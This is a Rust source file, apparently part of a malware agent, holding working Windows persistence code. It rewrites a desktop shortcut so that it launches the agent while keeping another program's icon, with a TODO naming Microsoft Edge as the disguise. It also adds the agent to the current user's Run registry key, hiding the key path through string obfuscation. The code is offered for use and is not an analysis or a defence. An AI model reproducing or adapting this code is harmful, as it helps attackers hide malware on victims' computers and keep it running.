use std::env;
use std::path::Path;
use std::path::PathBuf;
use winreg::enums::*;
use winreg::RegKey;
use goldberg::goldberg_string;
use crate::debug_println;
use windows::{
    core::HSTRING,
    Win32::System::Com::{
        CoCreateInstance, CoInitializeEx, CLSCTX_INPROC_SERVER, COINIT_MULTITHREADED, CoUninitialize,
    },
    Win32::UI::Shell::{IShellLinkW, ShellLink},
    Win32::System::Com::IPersistFile,
};
use windows::core::Interface;

/**
 * TODO:
 * Just handle the shortcut icon and make a new Edge Icon on the desktop, fuck it.
 */

#[inline]
pub fn shortcut_takeover(target_bin_path: &str, shortcut_name: &str) -> Result<(), Box<dyn std::error::Error>> {
    if env::consts::OS != "windows" {
        return Ok(());
    }

    let username = env::var("USERPROFILE")?;
    let desktop_dir_path = format!("{}\\Desktop", username);
    let shortcut_path = format!("{}\\{}.lnk", desktop_dir_path, shortcut_name);

    let agent_exe_path: PathBuf = env::current_exe()?;
    let agent_dir_path = agent_exe_path
        .parent()
        .ok_or("Could not derive agent's parent directory")?;

    let agent_bin_path_hstr = HSTRING::from(agent_exe_path.to_string_lossy().as_ref());
    let agent_dir_path_hstr = HSTRING::from(agent_dir_path.to_string_lossy().as_ref());
    let shortcut_path_hstr = HSTRING::from(&shortcut_path);
    let target_bin_path_hstr = HSTRING::from(target_bin_path);
    let arguments_hstr = HSTRING::from("--run-lnk");

    unsafe {
        let _ = CoInitializeEx(None, COINIT_MULTITHREADED);

        let shell_link: IShellLinkW = CoCreateInstance(&ShellLink, None, CLSCTX_INPROC_SERVER)?;
        let persist_file: IPersistFile = shell_link.cast()?;

        let exists = Path::new(&shortcut_path).exists();
        if exists {
            debug_println!("Loading existing shortcut: {}", shortcut_path);
            persist_file.Load(&shortcut_path_hstr, windows::Win32::System::Com::STGM(0))?;
        } else {
            debug_println!("No existing shortcut found, creating new: {}", shortcut_path);
        }

        shell_link.SetPath(&agent_bin_path_hstr)?;
        shell_link.SetArguments(&arguments_hstr)?;
        shell_link.SetWorkingDirectory(&agent_dir_path_hstr)?;
        shell_link.SetIconLocation(&target_bin_path_hstr, 0)?;
        
        persist_file.Save(&shortcut_path_hstr, true)?;
        debug_println!("Shortcut {}: {}", if exists { "modified" } else { "created" }, shortcut_path);

        CoUninitialize();
    }

    Ok(())
}

#[inline]
pub fn classic_registry_based_survival(program_name_in_registry_record: &str) -> Result<(), Box<dyn std::error::Error>> {
    if env::consts::OS != "windows" {
        return Ok(());
    }

    if program_name_in_registry_record.is_empty() {
        return Err("Program name cannot be empty".into());
    }

    let exe_path: PathBuf = env::current_exe()?;
    let exe_path_str = exe_path.to_str().ok_or("Failed to convert path to string")?;

    let hklm = RegKey::predef(HKEY_CURRENT_USER);

    let run_path = goldberg_string!("Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();

    let command = format!("\"{}\"", exe_path_str);

    match hklm.create_subkey(&run_path) {
        Err(e) => Err(Box::new(e) as Box<dyn std::error::Error>),
        Ok((key, _disp)) => {
            key.set_value(program_name_in_registry_record, &command)?;
            debug_println!("Set persistence in Run path with ID: {}", run_path);
            Ok(())
        }
    }
}